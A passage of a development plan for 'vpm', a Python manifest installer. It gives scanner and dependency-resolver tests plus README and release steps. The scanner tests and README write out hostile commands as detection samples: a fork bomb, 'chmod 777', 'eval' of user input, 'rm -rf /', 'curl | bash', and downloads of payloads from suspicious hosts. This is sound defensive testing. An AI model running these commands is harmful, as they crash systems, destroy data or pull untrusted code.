        assert any("pipe-to-shell" in f.pattern_name for f in high)

    def test_detect_chmod_777(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "Perms", "command": "chmod 777 /var/www"}])
        findings = scanner.scan_apps([app])
        high = [f for f in findings if f.pattern_name == "chmod-777"]
        assert len(high) >= 1

    def test_detect_eval_variable(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "Eval", "command": 'eval "$USER_INPUT"'}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "eval-variable" for f in findings)

    def test_safe_command_no_critical(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "Safe", "command": "sudo apt-get install -y nginx"}])
        findings = scanner.scan_apps([app])
        critical = [f for f in findings if f.severity == Severity.CRITICAL.value]
        assert len(critical) == 0

    def test_detect_fork_bomb(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "Bomb", "command": ":(){ :|:& };:"}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "fork-bomb" for f in findings)

    def test_detect_insecure_flag(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "DL", "command": "curl --insecure https://example.com"}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "insecure-download" for f in findings)


class TestURLAnalysis:
    def test_detect_url_shortener(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "DL", "command": "curl https://bit.ly/abc123"}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "url-shortener" for f in findings)

    def test_detect_suspicious_tld(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "DL", "command": "curl https://malware.xyz/payload"}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "suspicious-tld" for f in findings)

    def test_detect_http_non_https(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "DL", "command": "wget http://example.com/file"}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "non-https" for f in findings)

    def test_allowed_domain_skipped(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "DL", "command": "curl https://github.com/repo/file"}])
        findings = scanner.scan_apps([app])
        url_findings = [f for f in findings if f.pattern_name in ("suspicious-tld", "url-shortener", "non-https", "ip-only-url")]
        assert len(url_findings) == 0

    def test_detect_ip_only_url(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "DL", "command": "curl http://192.168.1.1/payload"}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "ip-only-url" for f in findings)


class TestSeverityLevels:
    def test_should_block_critical(self):
        scanner = make_scanner(level="warn")
        findings = [SecurityFinding(
            severity=Severity.CRITICAL.value, app_name="t", step_index=0,
            step_label="t", pattern_name="t", description="t", matched_text="t",
        )]
        assert scanner.should_block(findings) is True

    def test_should_not_block_high_in_warn_mode(self):
        scanner = make_scanner(level="warn")
        findings = [SecurityFinding(
            severity=Severity.HIGH.value, app_name="t", step_index=0,
            step_label="t", pattern_name="t", description="t", matched_text="t",
        )]
        assert scanner.should_block(findings) is False

    def test_should_block_high_in_strict_mode(self):
        scanner = make_scanner(level="strict")
        findings = [SecurityFinding(
            severity=Severity.HIGH.value, app_name="t", step_index=0,
            step_label="t", pattern_name="t", description="t", matched_text="t",
        )]
        assert scanner.should_block(findings) is True

    def test_off_blocks_nothing(self):
        scanner = make_scanner(level="off")
        findings = [SecurityFinding(
            severity=Severity.CRITICAL.value, app_name="t", step_index=0,
            step_label="t", pattern_name="t", description="t", matched_text="t",
        )]
        assert scanner.should_block(findings) is False

    def test_permissive_filters_medium(self):
        scanner = make_scanner(level="permissive")
        findings = [SecurityFinding(
            severity=Severity.MEDIUM.value, app_name="t", step_index=0,
            step_label="t", pattern_name="t", description="t", matched_text="t",
        )]
        assert len(scanner.filter_display(findings)) == 0
```

- [ ] **Step 5: Create tests/test_resolver.py**

```python
"""Tests for dependency resolution."""

import pytest
from unittest.mock import MagicMock
from vpm.executor import Executor
from vpm.manifest import ManifestApp
from vpm.config import Config
from vpm.lockfile import LockFile
from vpm.models import AppRecord, AppStatus


def make_executor():
    config = MagicMock(spec=Config)
    lock = MagicMock(spec=LockFile)
    lock.get_app.return_value = None
    return Executor(config, lock), lock


class TestResolveOrder:
    def test_no_dependencies(self):
        executor, lock = make_executor()
        apps = [
            ManifestApp("a", [{"label": "a", "command": "a"}]),
            ManifestApp("b", [{"label": "b", "command": "b"}]),
        ]
        order = executor.resolve_order(apps, lock)
        names = [a.name for a in order]
        assert set(names) == {"a", "b"}

    def test_simple_dependency(self):
        executor, lock = make_executor()
        apps = [
            ManifestApp("child", [{"label": "c", "command": "c"}], requires=["parent"]),
            ManifestApp("parent", [{"label": "p", "command": "p"}]),
        ]
        order = executor.resolve_order(apps, lock)
        names = [a.name for a in order]
        assert names.index("parent") < names.index("child")

    def test_chain_dependency(self):
        executor, lock = make_executor()
        apps = [
            ManifestApp("c", [{"label": "c", "command": "c"}], requires=["b"]),
            ManifestApp("b", [{"label": "b", "command": "b"}], requires=["a"]),
            ManifestApp("a", [{"label": "a", "command": "a"}]),
        ]
        order = executor.resolve_order(apps, lock)
        names = [a.name for a in order]
        assert names.index("a") < names.index("b") < names.index("c")

    def test_circular_dependency_raises(self):
        executor, lock = make_executor()
        apps = [
            ManifestApp("a", [{"label": "a", "command": "a"}], requires=["b"]),
            ManifestApp("b", [{"label": "b", "command": "b"}], requires=["a"]),
        ]
        with pytest.raises(ValueError, match="Circular dependency"):
            executor.resolve_order(apps, lock)

    def test_missing_dependency_raises(self):
        executor, lock = make_executor()
        apps = [
            ManifestApp("child", [{"label": "c", "command": "c"}], requires=["nonexistent"]),
        ]
        with pytest.raises(ValueError, match="not in the manifest"):
            executor.resolve_order(apps, lock)

    def test_external_dependency_satisfied(self):
        executor, lock = make_executor()
        # Mock: external dep is already installed
        record = MagicMock(spec=AppRecord)
        record.status = AppStatus.COMPLETED.value
        lock.get_app.return_value = record

        apps = [
            ManifestApp("child", [{"label": "c", "command": "c"}], requires=["external"]),
        ]
        order = executor.resolve_order(apps, lock)
        assert len(order) == 1
        assert order[0].name == "child"

    def test_diamond_dependency(self):
        executor, lock = make_executor()
        apps = [
            ManifestApp("d", [{"label": "d", "command": "d"}], requires=["b", "c"]),
            ManifestApp("c", [{"label": "c", "command": "c"}], requires=["a"]),
            ManifestApp("b", [{"label": "b", "command": "b"}], requires=["a"]),
            ManifestApp("a", [{"label": "a", "command": "a"}]),
        ]
        order = executor.resolve_order(apps, lock)
        names = [a.name for a in order]
        assert names.index("a") < names.index("b")
        assert names.index("a") < names.index("c")
        assert names.index("b") < names.index("d")
        assert names.index("c") < names.index("d")
```

- [ ] **Step 6: Verify tests run**

```bash
cd /path/to/vpm
pip install pytest --quiet 2>/dev/null || true
python3 -m pytest tests/ -v
```

Expected: All tests pass. If any fail due to the rollback parser changes not yet applied, fix the parser first (Task 5), then re-run.

- [ ] **Step 7: Commit**

```bash
git add tests/
git commit -m "test: add unit tests for manifest parser, models, scanner, and resolver"
```

---

## Task 12: Shell Completions Update

**Files:**
- Modify: `vpm/completions.py`

- [ ] **Step 1: Add new commands to completions**

In `completions.py`, each shell completion function has a list of commands. Add `audit`, `rollback`, and `run` to all three.

For `zsh_completion()`, find the `_arguments` or command list and add:

```
'audit:Scan manifest for security risks'
'rollback:Rollback a previously installed app'
'run:Fetch and execute a remote manifest'
```

And add completion specs for their arguments:
- `audit`: `--file` (file completion)
- `rollback`: app name (dynamic from lock file, same as retry/reset), `--dry-run`
- `run`: no special completion (free-form source argument), `--yes`, `--dry-run`

For `bash_completion()`, add the three commands to the `commands=` list and add case blocks for their flags.

For `fish_completion()`, add `complete` lines for the three new commands and their flags.

Also add `--skip-security` to the `install` command completions in all three shells.

- [ ] **Step 2: Verify completions generate without error**

```bash
cd /path/to/vpm
python3 -c "from vpm.completions import Completions; print(Completions.zsh_completion()[:200])"
python3 -c "from vpm.completions import Completions; print(Completions.bash_completion()[:200])"
python3 -c "from vpm.completions import Completions; print(Completions.fish_completion()[:200])"
```

- [ ] **Step 3: Commit**

```bash
git add vpm/completions.py
git commit -m "feat: add audit, rollback, run commands to shell completions"
```

---

## Task 13: README Updates

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Update installation section**

Replace the current pip/install instructions with:

```markdown
### Install from PyPI

```bash
pip install vpmx    # or: pipx install vpmx
vpm doctor          # verify environment
```

The PyPI package is `vpmx`, the CLI command is `vpm`.
```

- [ ] **Step 2: Add Security Scanner section**

After the "Commands Reference" section, add a new section:

```markdown
## Security Scanner

VPM includes a built-in security scanner that analyzes manifest commands before execution.

### What It Detects

| Severity | Examples |
|----------|----------|
| **Critical** | `rm -rf /`, fork bombs, disk formatting |
| **High** | `curl \| bash`, `eval $var`, `chmod 777`, SSL bypass |
| **Medium** | Downloads from unknown URLs, third-party repos, non-HTTPS |
| **Low** | `sudo` usage (expected but noted) |

### Usage

```bash
# Scan without executing
vpm audit
vpm audit --file manifest.yaml

# Auto-scan runs before every install (configurable)
vpm install                    # scans first, prompts on warnings
vpm install --skip-security    # bypass scan (not recommended)
```

### Configuration

In `~/.config/vpm/config.json`:

```json
{
  "security": {
    "level": "warn",
    "check_urls": false,
    "virustotal_api_key": null,
    "allowed_domains": ["github.com", "download.docker.com"]
  }
}
```

Levels: `strict` (block high+critical), `warn` (default), `permissive`, `off`
```

- [ ] **Step 3: Add Rollback section**

```markdown
## Rollback

Steps can define optional rollback commands that undo their changes:

```yaml
- label: Install Nginx
  run: sudo apt-get install -y nginx
  rollback: sudo apt-get remove -y nginx
```

```bash
vpm rollback my_app          # undo succeeded steps in reverse order
vpm rollback my_app --dry-run  # preview what would be undone
```

Rollback is best-effort: if a rollback step fails, remaining rollbacks still execute.
Only steps with `rollback:` defined and `status: success` are undone.
```

- [ ] **Step 4: Add Remote Manifests section**

```markdown
## Remote Manifests

Fetch and execute manifests from URLs or GitHub:

```bash
vpm run https://example.com/setup.yaml
vpm run github:user/repo                      # fetches vpm-manifest.yaml from repo root
vpm run github:user/repo/path/manifest.yaml   # specific file
```

Security scanning is mandatory for remote manifests and cannot be skipped.
```

- [ ] **Step 5: Update Architecture section**

Add `scanner.py` to the architecture diagram:

```
├── scanner.py       — Security scanning and URL analysis
```

- [ ] **Step 6: Add links to AGENTS.md and examples**

In the README, near the top or in a "For AI Agents" section:

```markdown
## For AI Agents

See [AGENTS.md](AGENTS.md) for a concise reference optimized for AI agent context windows.
See [examples/](examples/) for real-world manifest examples.
```

- [ ] **Step 7: Commit**

```bash
git add README.md
git commit -m "docs: update README with security scanner, rollback, remote manifests, and PyPI install"
```

---

## Task 14: CONTRIBUTING.md Update

**Files:**
- Modify: `CONTRIBUTING.md`

- [ ] **Step 1: Update CONTRIBUTING.md**

Add the new modules to the project structure section:

```markdown
├── scanner.py           # Security scanning and URL analysis
```

Add to the dependency flow:

```
style → ui → config → models → lockfile → manifest → scanner → executor → completions → app → cli
```

Add a testing section:

```markdown
## Running Tests

```bash
pip install pytest
python -m pytest tests/ -v
```

Tests cover: manifest parsing, data models, security scanner patterns, and dependency resolution.
```

Update the clone URL if needed (should already be correct).

- [ ] **Step 2: Commit**

```bash
git add CONTRIBUTING.md
git commit -m "docs: update CONTRIBUTING.md with new modules and testing instructions"
```

---

## Task 15: Final Verification & Tag

**Files:** None (verification only)

- [ ] **Step 1: Run full test suite**

```bash
cd /path/to/vpm
python3 -m pytest tests/ -v
```

All tests must pass.

- [ ] **Step 2: Verify all commands work**

```bash
python3 -m vpm version
python3 -m vpm doctor
python3 -m vpm init --force /tmp/vpm-test-init
python3 -m vpm audit --file /tmp/vpm-test-init/vpm-manifest.yaml
python3 -m vpm rollback --help
python3 -m vpm run --help
rm -rf /tmp/vpm-test-init
```

- [ ] **Step 3: Verify package builds**

```bash
pip install build 2>/dev/null || true
python3 -m build
ls dist/
# Should show: vpmx-1.1.0.tar.gz and vpmx-1.1.0-py3-none-any.whl
```

- [ ] **Step 4: Clean up dist**

```bash
rm -rf dist/ build/ *.egg-info vpm/*.egg-info
```

- [ ] **Step 5: Final commit and tag**

```bash
git add -A
git status  # Review all changes
git commit -m "release: vpmx v1.1.0 — security scanner, rollback, remote manifests, AI agent files"
git tag -a v1.1.0 -m "v1.1.0: Public release as vpmx"
```

- [ ] **Step 6: Push**

```bash
git push origin main
git push origin v1.1.0
```

The `v1.1.0` tag push will trigger the GitHub Actions publish workflow (once PyPI trusted publisher is configured).

---

## Post-Plan Notes

### PyPI Trusted Publisher Setup (Manual, One-Time)

Before the first publish, configure PyPI trusted publishing:

1. Go to https://pypi.org/manage/account/publishing/
2. Add a new pending publisher:
   - PyPI project name: `vpmx`
   - Owner: `Nao-30`
   - Repository: `vpm`
   - Workflow name: `publish.yml`
   - Environment name: `pypi`
3. On GitHub, create an environment named `pypi` in repo settings

### Future Work (Not in This Plan)

- Manifest registry website (deploy to microk8s)
- `vpm import` (convert docker-compose/scripts to manifests)
- `vpm export` (export as standalone shell script)
- Hooks system (pre/post install)
- Config file for per-project settings
- More security scanner rules based on community feedback
